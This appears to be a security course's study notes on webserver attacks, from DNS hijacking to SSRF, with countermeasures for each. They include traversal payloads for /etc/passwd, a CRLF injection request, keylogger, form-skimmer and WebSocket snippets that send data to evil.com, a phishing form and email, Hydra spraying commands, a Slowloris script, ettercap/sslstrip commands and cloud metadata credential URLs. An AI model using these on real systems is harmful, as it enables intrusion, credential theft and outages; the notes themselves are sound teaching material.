# 02_Different_WebServer_Attacks

## Table of Contents
1. [DNS Server Hijacking](#dns-server-hijacking)
2. [Directory Traversal Attack](#directory-traversal-attack)
3. [Webserver Misconfiguration](#webserver-misconfiguration)
4. [HTTP Response-Splitting Attack](#http-response-splitting-attack)
5. [Web Cache Poisoning Attack](#web-cache-poisoning-attack)
6. [SSH Brute Force Attack](#ssh-brute-force-attack)
7. [HTTP/2 Continuation Flood Attack](#http2-continuation-flood-attack)
8. [Frontjacking Attack](#frontjacking-attack)
9. [Webserver Password Cracking](#webserver-password-cracking)
10. [DoS/DDoS Attacks](#dosddos-attacks)
11. [Man in the Middle Attack](#man-in-the-middle-attack)
12. [Phishing Attack](#phishing-attack)
13. [Additional Webserver Attacks](#additional-webserver-attacks)

---

## DNS Server Hijacking

### Definition
DNS Server Hijacking is an attack where an attacker gains unauthorized access to a DNS server and modifies DNS records to redirect users to malicious websites.

### Types
- **Local DNS Hijacking**: Modifying local DNS settings
- **Router DNS Hijacking**: Compromising router DNS settings
- **Rogue DNS Server**: Setting up fake DNS servers
- **DNS Cache Poisoning**: Corrupting DNS cache with false information

### Attack Process
1. **Target Identification**: Identify vulnerable DNS servers
2. **Exploitation**: Exploit vulnerabilities in DNS software
3. **Record Modification**: Change DNS records to point to attacker-controlled servers
4. **Traffic Redirection**: Users are redirected to malicious sites

### Common Vulnerabilities
- Weak authentication mechanisms
- Unpatched DNS server software
- Misconfigured DNS zones
- Lack of DNSSEC implementation

### Tools Used
- **DNSChef**: DNS proxy for penetration testing
- **SET (Social Engineer Toolkit)**: DNS spoofing capabilities
- **Ettercap**: DNS spoofing through ARP poisoning
- **Bettercap**: Network attack and monitoring framework

### Indicators
- Unexpected website redirections
- SSL certificate warnings
- Slow DNS resolution
- Unusual network traffic patterns

### Countermeasures
- Implement DNSSEC (DNS Security Extensions)
- Use secure DNS servers (Cloudflare, Google DNS)
- Regular DNS server updates and patches
- Monitor DNS queries for anomalies
- Implement DNS filtering and blocking

---

## Directory Traversal Attack

### Definition
Directory Traversal (Path Traversal) is an attack that allows attackers to access files and directories outside the web root folder by manipulating file path references.

### Common Techniques
- **Dot-dot-slash (../)**:  `../../../etc/passwd`
- **Absolute Path**: `/etc/passwd`
- **URL Encoding**: `%2e%2e%2f` for `../`
- **Double Encoding**: `%252e%252e%252f`
- **Unicode Encoding**: `%c0%ae%c0%ae%c0%af`

### Attack Vectors
- Web application parameters
- File upload functionalities
- Include/require statements
- Cookie values
- HTTP headers

### Target Files (Linux)
- `/etc/passwd` - User accounts
- `/etc/shadow` - Password hashes
- `/etc/hosts` - Host configurations
- `/var/log/auth.log` - Authentication logs
- `/proc/version` - System information

### Target Files (Windows)
- `C:\Windows\System32\drivers\etc\hosts`
- `C:\Windows\win.ini`
- `C:\boot.ini`
- `C:\Windows\System32\config\SAM`

### Tools
- **Burp Suite**: Web application security testing
- **OWASP ZAP**: Security proxy
- **Nikto**: Web vulnerability scanner
- **DirBuster**: Directory and file brute forcer

### Example Payloads
```
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Countermeasures
- Input validation and sanitization
- Use whitelist approach for file access
- Implement proper access controls
- Chroot jails or containerization
- Web application firewalls (WAF)

---

## Webserver Misconfiguration

### Definition
Webserver misconfigurations are security vulnerabilities that arise from improper server setup, leaving systems exposed to various attacks.

### Common Misconfigurations

#### Directory Listing
- Enabled directory browsing
- Exposes sensitive files and structure
- Default Apache/Nginx configurations

#### Default Credentials
- Unchanged default passwords
- Default administrative accounts
- Vendor-specific defaults

#### Unnecessary Services
- Running unused services
- Default installations with extra components
- Exposed administrative interfaces

#### Information Disclosure
- Server version in headers
- Error messages revealing system info
- Debug information exposure

#### SSL/TLS Issues
- Weak cipher suites
- Expired certificates
- Mixed content (HTTP/HTTPS)
- Insecure protocols (SSLv3, TLS 1.0)

### Vulnerable Configurations

#### Apache
- `.htaccess` misconfigurations
- `mod_status` and `mod_info` enabled
- Improper virtual host settings

#### Nginx
- Incorrect location blocks
- Missing security headers
- Improper proxy configurations

#### IIS
- Default error pages
- Unused ISAPI extensions
- Improper authentication settings

### Assessment Tools
- **Nmap**: Service detection and version enumeration
- **Nikto**: Web server vulnerability scanner
- **SSLyze**: SSL/TLS configuration analyzer
- **testssl.sh**: SSL/TLS testing script

### Countermeasures
- Regular security audits and assessments
- Remove or disable unused services
- Change default credentials
- Implement proper error handling
- Use security headers (HSTS, CSP, X-Frame-Options)
- Regular updates and patches

---

## HTTP Response-Splitting Attack

### Definition
HTTP Response Splitting is an attack where an attacker manipulates HTTP responses by injecting malicious data into HTTP headers, potentially leading to cache poisoning, XSS, or session hijacking.

### Attack Mechanism
1. **Input Injection**: Inject CRLF characters (\r\n) into user input
2. **Header Manipulation**: Split HTTP response into multiple responses
3. **Payload Injection**: Insert malicious content in the split response

### Common Injection Points
- URL parameters
- Form fields
- HTTP headers (Referer, User-Agent)
- Cookie values
- Redirect parameters

### Example Attack
```
GET /redirect.php?url=http://example.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<script>alert(1)</script>
```

### Consequences
- **Web Cache Poisoning**: Pollute proxy/cache with malicious content
- **Cross-Site Scripting (XSS)**: Execute malicious scripts
- **Session Hijacking**: Steal user sessions
- **Credential Theft**: Capture login credentials

### Vulnerable Code Example
```php
<?php
header("Location: " . $_GET['url']);
?>
```

### Detection Techniques
- Manual testing with CRLF injection
- Automated scanners (Burp Suite, OWASP ZAP)
- Code review for unsanitized header inputs
- Response analysis for split responses

### Countermeasures
- **Input Validation**: Strip or encode CRLF characters
- **Output Encoding**: Properly encode HTTP headers
- **Framework Protection**: Use secure web frameworks
- **Header Validation**: Validate all header values
- **WAF Implementation**: Use web application firewalls

---

## Web Cache Poisoning Attack

### Definition
Web Cache Poisoning is an attack where an attacker exploits web cache behavior to serve malicious content to legitimate users by manipulating cached responses.

### Types of Cache Poisoning

#### HTTP Header Poisoning
- Manipulate Host headers
- X-Forwarded-Host header abuse
- X-Original-URL header manipulation

#### Parameter Pollution
- Exploit parameter parsing differences
- Cache key vs. application logic discrepancies

#### Response Manipulation
- Cache responses with malicious payloads
- Exploit cache key normalization issues

### Attack Process
1. **Cache Analysis**: Identify cache behavior and keys
2. **Payload Crafting**: Create malicious cache entries
3. **Cache Poisoning**: Inject malicious responses into cache
4. **Victim Exploitation**: Serve poisoned content to users

### Common Scenarios
- **CDN Poisoning**: Poison Content Delivery Networks
- **Proxy Cache Poisoning**: Target corporate proxies
- **Browser Cache Poisoning**: Exploit browser caching
- **DNS Cache Poisoning**: Corrupt DNS cache entries

### Exploitation Techniques
```http
GET /page HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: evil.com

# Results in cached response pointing to evil.com
```

### Detection Methods
- **Cache Behavior Analysis**: Study cache headers and responses
- **Parameter Testing**: Test different parameter combinations
- **Header Manipulation**: Test various HTTP headers
- **Time-based Analysis**: Observe response time variations

### Tools
- **Burp Suite**: Web cache poisoning extensions
- **Param Miner**: Parameter discovery tool
- **Cache-Poisoning-Scanner**: Automated cache poisoning detection
- **Web Cache Vulnerability Scanner**: Specialized scanners

### Real-world Impact
- **Malware Distribution**: Serve malware to users
- **Credential Theft**: Redirect to phishing pages
- **Defacement**: Display malicious content
- **SEO Poisoning**: Manipulate search engine results

### Countermeasures
- **Proper Cache Key Design**: Include all relevant parameters
- **Input Validation**: Validate all cache-affecting inputs
- **Cache Headers**: Implement proper cache control headers
- **Cache Segmentation**: Separate caches for different user types
- **Regular Cache Purging**: Implement cache invalidation mechanisms

---

## SSH Brute Force Attack

### Definition
SSH Brute Force attacks involve attempting to gain unauthorized access to SSH servers by systematically trying different username and password combinations.

### Attack Types
- **Dictionary Attack**: Using common passwords
- **Credential Stuffing**: Using leaked credentials
- **Rainbow Table Attack**: Precomputed hash lookups
- **Hybrid Attack**: Combining dictionary and brute force

### Common Targets
- Default SSH port (22)
- Non-standard SSH ports
- Weak credentials (admin/admin, root/root)
- Service accounts with weak passwords

### Attack Tools
- **Hydra**: Fast network login cracker
- **Medusa**: Parallel brute force tool
- **Ncrack**: Network authentication cracking tool
- **Patator**: Multi-purpose brute forcer
- **BruteSpray**: Automated brute force tool

### Command Examples
```bash
# Hydra SSH brute force
hydra -l admin -P passwords.txt ssh://target-ip

# Medusa SSH attack
medusa -h target-ip -u admin -P passwords.txt -M ssh

# Ncrack SSH brute force
ncrack -p 22 -u admin -P passwords.txt target-ip
```

### Common Usernames
- root, admin, administrator
- user, guest, test
- oracle, postgres, mysql
- www-data, apache, nginx

### Password Lists
- **rockyou.txt**: Common password list
- **SecLists**: Various password lists
- **OWASP**: Default password lists
- **Custom Lists**: Target-specific passwords

### Detection Indicators
- Multiple failed login attempts
- Unusual login patterns
- High network traffic on port 22
- Log entries showing brute force attempts

### Countermeasures
- **Strong Password Policy**: Enforce complex passwords
- **Key-based Authentication**: Use SSH keys instead of passwords
- **Fail2Ban**: Automatically block suspicious IPs
- **Port Modification**: Change default SSH port
- **Rate Limiting**: Limit connection attempts
- **Two-Factor Authentication**: Add extra security layer
- **IP Whitelisting**: Allow only authorized IPs
- **Account Lockout**: Lock accounts after failed attempts

---

## HTTP/2 Continuation Flood Attack

### Definition
HTTP/2 Continuation Flood is a denial-of-service attack that exploits the CONTINUATION frame feature in HTTP/2 to overwhelm servers with malformed requests.

### HTTP/2 Background
- Binary protocol replacing HTTP/1.1
- Multiplexing multiple requests over single connection
- Frame-based communication
- Header compression using HPACK

### CONTINUATION Frame Abuse
- CONTINUATION frames carry header fragments
- Must follow HEADERS or other CONTINUATION frames
- Can be chained indefinitely
- No built-in limits in original specification

### Attack Mechanism
1. **Connection Establishment**: Establish HTTP/2 connection
2. **Header Fragmentation**: Send incomplete HEADERS frame
3. **Continuation Flood**: Send unlimited CONTINUATION frames
4. **Resource Exhaustion**: Consume server memory and CPU

### Attack Impact
- **Memory Exhaustion**: Consume server RAM
- **CPU Overload**: Processing overhead
- **Connection Pool Depletion**: Exhaust available connections
- **Service Unavailability**: Deny service to legitimate users

### Vulnerable Implementations
- Web servers with improper HTTP/2 handling
- Reverse proxies without continuation limits
- Load balancers with inadequate protection
- CDNs with vulnerable HTTP/2 implementations

### Attack Tools
- **h2spec**: HTTP/2 conformance testing tool
- **Custom Scripts**: Python/Go HTTP/2 clients
- **Burp Suite**: HTTP/2 testing capabilities
- **nghttp2**: HTTP/2 implementation tools

### Example Attack Code Concept
```python
# Pseudocode for continuation flood
connection = http2.Connection()
headers = [(':method', 'GET'), (':path', '/')]

# Send incomplete headers
connection.send_headers(stream_id=1, headers=headers, end_headers=False)

# Flood with continuation frames
for i in range(10000):
    connection.send_continuation(stream_id=1, data=b'X' * 1000, end_headers=False)
```

### Detection Methods
- **Traffic Analysis**: Monitor HTTP/2 frame patterns
- **Resource Monitoring**: Track memory and CPU usage
- **Connection Analysis**: Monitor connection behavior
- **Frame Counting**: Track CONTINUATION frame ratios

### Countermeasures
- **Frame Limits**: Implement maximum frame counts
- **Size Limits**: Limit total header size
- **Rate Limiting**: Control request rates
- **Connection Limits**: Limit concurrent connections
- **HTTP/2 Hardening**: Configure proper HTTP/2 settings
- **Regular Updates**: Update web server software
- **Monitoring**: Implement real-time monitoring

---

## Frontjacking Attack

### Definition
Frontjacking (Frontend Hijacking) is an attack that exploits third-party JavaScript dependencies to inject malicious code into web applications, compromising user interactions and data.

### Attack Vectors
- **Supply Chain Attacks**: Compromising third-party libraries
- **CDN Poisoning**: Injecting malicious code into CDN-hosted resources
- **Subdomain Takeover**: Taking over abandoned subdomains hosting resources
- **Dependency Confusion**: Exploiting package manager vulnerabilities

### Common Targets
- JavaScript libraries (jQuery, Bootstrap, etc.)
- Analytics scripts (Google Analytics, etc.)
- Social media widgets
- Payment processing scripts
- Advertising networks

### Attack Process
1. **Dependency Analysis**: Identify third-party dependencies
2. **Vulnerability Discovery**: Find compromisable resources
3. **Code Injection**: Inject malicious JavaScript
4. **Data Exfiltration**: Steal sensitive information

### Injection Methods
```javascript
// Malicious code injection example
(function() {
    // Keylogger
    document.addEventListener('keypress', function(e) {
        fetch('https://evil.com/log?key=' + e.key);
    });
    
    // Form hijacking
    document.querySelectorAll('form').forEach(form => {
        form.addEventListener('submit', function(e) {
            fetch('https://evil.com/steal', {
                method: 'POST',
                body: new FormData(form)
            });
        });
    });
})();
```

### Impact
- **Data Theft**: Steal user credentials and sensitive data
- **Session Hijacking**: Compromise user sessions
- **Malware Distribution**: Distribute malicious software
- **Phishing**: Redirect users to fake login pages
- **Cryptocurrency Mining**: Use victim's resources for mining

### Detection Techniques
- **Subresource Integrity (SRI)**: Verify resource integrity
- **Content Security Policy (CSP)**: Restrict resource loading
- **Static Analysis**: Analyze JavaScript code changes
- **Runtime Monitoring**: Monitor JavaScript behavior
- **Network Monitoring**: Track resource loading patterns

### Real-world Examples
- **British Airways Attack**: Magecart group compromise
- **Ticketmaster Breach**: Third-party chat widget compromise
- **Newegg Attack**: Payment page skimmer injection

### Prevention Strategies
- **Subresource Integrity**: Implement SRI for all external resources
```html
<script src="https://cdn.example.com/lib.js" 
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

- **Content Security Policy**: Implement strict CSP headers
```http
Content-Security-Policy: script-src 'self' https://trusted-cdn.com
```

### Countermeasures
- **Dependency Management**: Regularly audit and update dependencies
- **Self-hosting**: Host critical resources internally
- **SRI Implementation**: Use Subresource Integrity checks
- **CSP Deployment**: Implement Content Security Policy
- **Regular Monitoring**: Monitor for resource changes
- **Backup Resources**: Have fallback resources ready

---

## Webserver Password Cracking

### Definition
Webserver Password Cracking involves attempting to discover passwords used to access web server administrative interfaces, databases, and protected areas through various attack techniques.

### Attack Types

#### Online Attacks
- **Brute Force**: Systematic password attempts
- **Dictionary Attack**: Common password lists
- **Credential Stuffing**: Using leaked credentials
- **Password Spraying**: Common passwords against many accounts

#### Offline Attacks
- **Hash Cracking**: Cracking password hashes
- **Rainbow Tables**: Precomputed hash lookups
- **Hybrid Attacks**: Combining multiple techniques

### Common Targets
- Web administration panels
- Database management interfaces (phpMyAdmin, pgAdmin)
- FTP/SFTP services
- Content Management Systems (WordPress, Joomla)
- Application-specific login forms

### Password Attack Tools

#### Online Tools
- **Hydra**: Network login cracker
- **Medusa**: Parallel brute force tool
- **Burp Suite**: Web application testing
- **OWASP ZAP**: Security proxy with brute force capabilities

#### Offline Tools
- **John the Ripper**: Password hash cracker
- **Hashcat**: Advanced password recovery
- **Aircrack-ng**: Wireless password cracking
- **RainbowCrack**: Rainbow table password cracker

### Hash Types Commonly Encountered
- **MD5**: Weak, fast to crack
- **SHA-1**: Deprecated, vulnerable
- **bcrypt**: Strong, slow to crack
- **scrypt**: Memory-hard function
- **Argon2**: Modern, secure option

### Attack Techniques

#### Dictionary Attack Example
```bash
# Hydra dictionary attack
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://target.com/admin/

# Burp Suite Intruder
# Configure payload positions and wordlist
```

#### Password Spraying
```bash
# Test common passwords against multiple accounts
for user in $(cat users.txt); do
    hydra -l $user -p Password123 http-post-form://target.com/login.php
done
```

### Common Weak Passwords
- Default passwords (admin/admin, root/root)
- Simple passwords (123456, password, qwerty)
- Seasonal passwords (Summer2024, Winter2024)
- Company-related passwords (CompanyName123)

### Password Policy Bypass
- **Case Variation**: Password → password, PASSWORD
- **Character Substitution**: @ for a, 3 for e, $ for s
- **Appending Numbers**: password1, password123
- **Keyboard Patterns**: qwerty123, asdf1234

### Detection Methods
- **Log Analysis**: Monitor failed login attempts
- **Rate Monitoring**: Track request frequencies
- **Pattern Recognition**: Identify systematic attacks
- **Account Lockout Monitoring**: Track locked accounts

### Countermeasures
- **Strong Password Policy**: Enforce complex passwords
- **Account Lockout**: Lock accounts after failed attempts
- **Rate Limiting**: Limit login attempt frequency
- **Multi-Factor Authentication**: Require additional authentication factors
- **CAPTCHA**: Implement anti-automation measures
- **Password Hashing**: Use strong hashing algorithms (bcrypt, Argon2)
- **Monitoring**: Implement real-time attack detection

---

## DoS/DDoS Attacks

### Definition
Denial of Service (DoS) and Distributed Denial of Service (DDoS) attacks aim to make web services unavailable by overwhelming them with traffic or exploiting resource consumption vulnerabilities.

### Types of DoS/DDoS Attacks

#### Volume-Based Attacks
- **UDP Flood**: Overwhelming with UDP packets
- **ICMP Flood**: Ping flood attacks
- **Other Protocol Floods**: TCP, HTTP floods

#### Protocol Attacks
- **SYN Flood**: Exploiting TCP handshake
- **Ping of Death**: Oversized ping packets
- **Smurf Attack**: Broadcast ping exploitation

#### Application Layer Attacks
- **HTTP Flood**: Overwhelming HTTP requests
- **Slowloris**: Slow HTTP requests
- **Slow POST**: Slow HTTP POST attacks
- **HTTP/2 Rapid Reset**: Exploiting HTTP/2 features

### HTTP-Specific Attacks

#### Slowloris Attack
- Keeps connections open with partial requests
- Sends minimal data to avoid timeout
- Exhausts server connection pool

```python
# Slowloris attack concept
import socket
import time

def slowloris_attack(target, port):
    sockets = []
    for i in range(200):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
        sockets.append(sock)
    
    while True:
        for sock in sockets:
            sock.send(b"X-a: b\r\n")
        time.sleep(10)
```

#### HTTP Flood
- High volume of HTTP requests
- Can target specific endpoints
- May use botnets for distribution

#### POST Flood
- Large POST requests to consume bandwidth
- Target form processing endpoints
- Can include large file uploads

### DDoS Attack Architectures

#### Botnet-Based
- Infected computers (zombies)
- Command and control (C&C) servers
- Coordinated attack execution

#### Amplification Attacks
- **DNS Amplification**: Small query, large response
- **NTP Amplification**: Network Time Protocol abuse
- **SNMP Amplification**: Simple Network Management Protocol

#### Reflection Attacks
- Spoof victim's IP address
- Send requests to reflectors
- Amplified traffic directed at victim

### Attack Tools

#### DoS Tools
- **LOIC (Low Orbit Ion Cannon)**: Simple DoS tool
- **HOIC (High Orbit Ion Cannon)**: Advanced version
- **Slowloris**: Slow connection attack tool
- **GoldenEye**: Python-based HTTP DoS

#### DDoS Tools
- **Mirai**: IoT botnet malware
- **XOIC**: Network stress testing
- **Hping3**: Packet crafting tool
- **Scapy**: Packet manipulation library

### Attack Indicators
- Unusually slow network performance
- Unavailability of services
- High server resource utilization
- Increased network traffic
- Connection timeouts

### Mitigation Strategies

#### Network Level
- **Rate Limiting**: Limit requests per IP
- **Traffic Filtering**: Block malicious traffic patterns
- **Load Balancing**: Distribute traffic across servers
- **Blackholing**: Route attack traffic to null interface

#### Application Level
- **Connection Limits**: Limit concurrent connections
- **Timeout Configuration**: Set appropriate timeouts
- **Resource Monitoring**: Monitor CPU, memory usage
- **Caching**: Reduce server load with caching

#### Cloud-Based Protection
- **CDN Services**: Cloudflare, AWS CloudFront
- **DDoS Protection**: Specialized DDoS mitigation services
- **Auto-scaling**: Automatic resource scaling
- **Geographic Filtering**: Block traffic from specific regions

### Countermeasures
- **Incident Response Plan**: Prepare for DDoS attacks
- **Monitoring Systems**: Real-time attack detection
- **Redundancy**: Multiple server locations
- **ISP Coordination**: Work with ISP for upstream filtering
- **Regular Testing**: Test DDoS mitigation effectiveness

---

## Man in the Middle Attack

### Definition
Man in the Middle (MITM) attacks occur when an attacker secretly intercepts and potentially alters communications between two parties who believe they are communicating directly with each other.

### Types of MITM Attacks

#### Network-Based MITM
- **ARP Spoofing**: Manipulating ARP tables
- **DNS Spoofing**: Redirecting DNS queries
- **DHCP Spoofing**: Rogue DHCP server attacks
- **Router Compromise**: Compromising network infrastructure

#### SSL/TLS MITM
- **SSL Stripping**: Downgrading HTTPS to HTTP
- **Certificate Spoofing**: Using fake SSL certificates
- **SSL Hijacking**: Intercepting SSL connections
- **Certificate Pinning Bypass**: Circumventing certificate validation

#### Wireless MITM
- **Evil Twin**: Fake Wi-Fi access points
- **Wi-Fi Pineapple**: Wireless auditing platform
- **Rogue Access Point**: Unauthorized Wi-Fi networks
- **WPA/WPA2 Attacks**: Wireless encryption breaks

### Attack Process
1. **Positioning**: Place attacker between victim and target
2. **Interception**: Capture communications
3. **Decryption**: Decrypt encrypted communications if possible
4. **Manipulation**: Modify data if desired
5. **Relay**: Forward modified/unmodified data

### Common Attack Scenarios

#### Public Wi-Fi Attacks
```bash
# ARP spoofing example
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# DNS spoofing
ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.100//
```

#### SSL Stripping
```bash
# Using sslstrip
sslstrip -l 8080

# Configure iptables for traffic redirection
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

### Attack Tools

#### Network MITM Tools
- **Ettercap**: Comprehensive MITM framework
- **Bettercap**: Modern network attack framework
- **MITMf**: Man-in-the-Middle attack framework
- **Cain & Abel**: Windows-based network tool

#### SSL/TLS Tools
- **SSLstrip**: SSL stripping tool
- **SSLsplit**: Transparent SSL/TLS proxy
- **MITMproxy**: Interactive TLS-capable proxy
- **Burp Suite**: Web application proxy

#### Wireless Tools
- **Aircrack-ng**: Wireless security auditing
- **Wi-Fi Pineapple**: Wireless penetration testing platform
- **Hostapd**: User space daemon for access points
- **Kismet**: Wireless network detector

### Data Interception Methods

#### HTTP Traffic
- Capture plaintext credentials
- Session cookie theft
- Form data interception
- API key extraction

#### HTTPS Traffic
- Certificate-based attacks
- SSL stripping techniques
- Protocol downgrade attacks
- Certificate authority compromise

### Detection Methods
- **SSL Certificate Warnings**: Browser security alerts
- **Unusual Network Behavior**: Unexpected redirects or performance
- **Certificate Analysis**: Check certificate details and chains
- **Network Monitoring**: Monitor for ARP/DNS anomalies
- **HSTS Violations**: HTTP Strict Transport Security failures

### Real-World Examples
- **Superfish Adware**: Pre-installed certificate authority
- **NSA Quantum**: Nation-state MITM attacks
- **Public Wi-Fi Attacks**: Coffee shop and airport attacks
- **ISP Injection**: Internet service provider content injection

### Countermeasures

#### Client-Side Protection
- **HTTPS Everywhere**: Force HTTPS connections
- **Certificate Pinning**: Validate specific certificates
- **VPN Usage**: Encrypt all network traffic
- **Public Key Pinning**: Pin public keys in applications

#### Server-Side Protection
- **HSTS Headers**: HTTP Strict Transport Security
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

- **Certificate Transparency**: Monitor certificate issuance
- **HPKP**: HTTP Public Key Pinning
- **Perfect Forward Secrecy**: Use ephemeral key exchanges

#### Network Protection
- **Network Monitoring**: Deploy intrusion detection systems
- **ARP Monitoring**: Detect ARP spoofing attempts
- **DNS Security**: Use secure DNS (DoH, DoT)
- **Network Segmentation**: Isolate critical systems

---

## Phishing Attack

### Definition
Phishing attacks are social engineering attacks where attackers impersonate legitimate entities to steal sensitive information such as usernames, passwords, credit card numbers, or other personal data.

### Types of Phishing

#### Email Phishing
- **Generic Phishing**: Mass-distributed fake emails
- **Spear Phishing**: Targeted attacks on specific individuals
- **Whaling**: Targeting high-profile individuals (executives)
- **Clone Phishing**: Cloning legitimate emails with malicious links

#### Web-Based Phishing
- **Fake Websites**: Replicas of legitimate sites
- **URL Manipulation**: Using similar-looking domains
- **Subdomain Attacks**: Abusing legitimate subdomains
- **Homograph Attacks**: Using similar Unicode characters

#### Technical Phishing
- **DNS Spoofing**: Redirecting legitimate domains
- **Pharming**: Large-scale DNS manipulation
- **Tabnabbing**: Browser tab manipulation
- **Session Hijacking**: Stealing authentication sessions

### Attack Process
1. **Reconnaissance**: Research targets and organizations
2. **Content Creation**: Create convincing phishing content
3. **Delivery**: Send phishing emails or create fake sites
4. **Data Harvesting**: Collect submitted credentials
5. **Exploitation**: Use stolen credentials for malicious purposes

### Phishing Techniques

#### Email Spoofing
```email
From: security@legitimate-bank.com
Subject: Urgent: Verify Your Account
To: victim@email.com

Dear Customer,

We have detected suspicious activity on your account. Please verify your 
identity by clicking the link below within 24 hours to avoid account suspension.

[Verify Account Now] -> https://legitimate-bank-security.evil.com/verify
```

#### Domain Spoofing Techniques
- **Typosquatting**: googIe.com instead of google.com
- **Homograph Attack**: using Cyrillic 'а' instead of Latin 'a'
- **Subdomain Abuse**: legitimate-site.evil.com
- **URL Shortening**: bit.ly/xxx to hide real destination

#### Social Engineering Elements
- **Urgency**: "Act within 24 hours"
- **Authority**: Impersonating banks, government agencies
- **Fear**: "Your account will be suspended"
- **Curiosity**: "You've won a prize"
- **Trust**: Using familiar logos and branding

### Phishing Kit Components

#### Frontend Components
- **Login Forms**: Replica of legitimate login pages
- **SSL Certificates**: Let's Encrypt or stolen certificates
- **Brand Assets**: Logos, colors, fonts matching legitimate sites
- **Responsive Design**: Mobile-friendly phishing pages

#### Backend Components
- **Data Collection**: Scripts to capture form submissions
- **Email Notification**: Alerts when credentials are captured
- **Redirection Logic**: Redirect to legitimate site after capture
- **Anti-Detection**: Geofencing, bot detection

### Common Phishing Targets
- **Banking Websites**: Online banking portals
- **Social Media**: Facebook, LinkedIn, Twitter
- **Email Providers**: Gmail, Outlook, Yahoo
- **E-commerce**: Amazon, eBay, PayPal
- **Cloud Services**: Google Drive, Dropbox, Office 365

### Attack Tools and Frameworks

#### Phishing Frameworks
- **Social Engineer Toolkit (SET)**: Automated phishing attacks
- **King Phisher**: Phishing campaign toolkit
- **Gophish**: Open-source phishing framework
- **PhishX**: Phishing simulation platform

#### Email Tools
- **MailSniper**: Email reconnaissance tool
- **SpamTitan**: Email security testing
- **PhishMe**: Phishing simulation service
- **Lucy**: Security awareness training platform

#### Website Cloning
- **HTTrack**: Website mirroring tool
- **wget**: Command-line website downloader
- **Burp Suite**: Web application cloning capabilities
- **Custom Scripts**: Python/PHP website cloners

### Advanced Phishing Techniques

#### Business Email Compromise (BEC)
- Target finance departments
- Impersonate executives or vendors
- Request wire transfers or sensitive data
- Use compromised email accounts

#### Credential Harvesting
```html
<!-- Example phishing form -->
<form action="https://evil.com/harvest.php" method="post">
    <input type="email" name="email" placeholder="Email" required>
    <input type="password" name="password" placeholder="Password" required>
    <input type="hidden" name="target" value="legitimate-bank.com">
    <button type="submit">Sign In</button>
</form>
```

#### Multi-Factor Authentication Bypass
- **Real-time Proxying**: MiTM attacks on 2FA
- **SIM Swapping**: Taking control of phone numbers
- **Social Engineering**: Tricking users to provide OTP codes
- **Malware**: Intercepting authentication tokens

### Detection Indicators
- **Suspicious URLs**: Misspelled domains, suspicious TLDs
- **Poor Grammar**: Spelling and grammatical errors
- **Generic Greetings**: "Dear Customer" instead of actual names
- **Urgent Language**: Creating false sense of urgency
- **Mismatched Information**: Sender vs. reply-to addresses

### Automated Detection Methods
- **URL Analysis**: Check against blacklists and reputation services
- **Content Analysis**: Machine learning for phishing detection
- **Header Analysis**: Examine email headers for spoofing indicators
- **Certificate Validation**: Check SSL certificate legitimacy

### Countermeasures

#### User Education
- **Security Awareness Training**: Regular phishing simulations
- **Recognition Training**: How to identify phishing attempts
- **Reporting Procedures**: Easy reporting mechanisms
- **Best Practices**: Safe browsing and email habits

#### Technical Controls
- **Email Security**: SPF, DKIM, DMARC implementation
```dns
# SPF Record
v=spf1 include:_spf.google.com ~all

# DMARC Record  
v=DMARC1; p=reject; rua=mailto:dmarc@domain.com
```

- **Web Filtering**: Block known phishing sites
- **Browser Security**: Use browsers with anti-phishing features
- **Multi-Factor Authentication**: Implement strong 2FA/MFA

#### Organizational Measures
- **Incident Response**: Procedures for phishing incidents
- **Regular Monitoring**: Monitor for domain abuse and spoofing
- **Brand Protection**: Monitor for trademark abuse
- **Takedown Services**: Rapid response to phishing sites

---
### WebSocket Security Issues

#### Common WebSocket Vulnerabilities
- **Cross-Site WebSocket Hijacking**: CSRF-like attacks on WebSockets
- **Input Validation Issues**: Lack of input validation in WebSocket messages
- **Authentication Bypass**: Weak authentication in WebSocket connections
- **Message Injection**: Injecting malicious messages

#### WebSocket Attack Example
```javascript
// Cross-Site WebSocket Hijacking
var ws = new WebSocket("wss://vulnerable-site.com/websocket");
ws.onmessage = function(event) {
    // Steal data from WebSocket messages
    fetch('https://evil.com/steal', {
        method: 'POST',
        body: event.data
    });
};
```

### API Security Vulnerabilities

#### Common API Attacks
- **Broken Authentication**: Weak API authentication
- **Excessive Data Exposure**: APIs returning too much data  
- **Rate Limiting Issues**: Lack of proper rate limiting
- **Injection Attacks**: SQL, NoSQL, command injection in APIs
- **Business Logic Flaws**: Exploiting API logic vulnerabilities

#### GraphQL Specific Attacks
- **Query Complexity Attacks**: Resource exhaustion through complex queries
- **Query Depth Attacks**: Deeply nested query attacks
- **Introspection Abuse**: Information disclosure through introspection
- **Batch Query Attacks**: Resource exhaustion through query batching

### Cloud-Specific Web Attacks

#### Server-Side Request Forgery (SSRF) in Cloud
```
# AWS metadata service
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud metadata
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

#### Container Escape Attacks
- **Docker Socket Exposure**: Access to Docker daemon
- **Privileged Container Abuse**: Escaping privileged containers
- **Host Path Mounting**: Accessing host filesystem
- **Capability Abuse**: Exploiting excessive container capabilities

### Emerging Attack Vectors

#### HTTP/3 and QUIC Attacks
- **Stream Multiplexing Abuse**: Resource exhaustion through stream manipulation
- **Connection Migration Attacks**: Exploiting connection migration features
- **0-RTT Replay Attacks**: Replay attacks on 0-RTT data

#### Progressive Web App (PWA) Attacks
- **Service Worker Abuse**: Malicious service worker registration
